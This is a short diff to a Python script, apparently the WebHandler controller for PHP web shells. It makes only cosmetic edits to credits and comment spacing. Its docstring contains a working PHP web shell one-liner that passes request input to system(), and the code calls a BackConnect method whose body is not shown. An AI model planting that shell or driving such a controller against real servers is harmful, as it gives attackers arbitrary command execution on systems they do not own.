@@ -2,7 +2,6 @@
 
 '''
 -*- coding: utf-8 -*-
-Copyright 2012 Ahmed Shawky @lnxg33k <ahmed@isecur1ty.org>
 
 Command controller for <?php system($_REQUEST[parameter]); ?>
 
@@ -10,6 +9,10 @@ This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 See the GNU General Public License for more details.
+
+Developers:
+    Ahmed Shawky @lnxg33k
+    g0tmi1k @g0tmi1k
 '''
 
 #importing modules
@@ -27,5 +30,5 @@ if getargs.url:
         exit(1)
     else:
         print banner                            # get WebHandler banner
-        info.get_information()                # call get_information and print info
-        commander.BackConnect()                     # call BackConnect method
+        info.get_information()                  # call get_information and print info
+        commander.BackConnect()                 # call BackConnect method
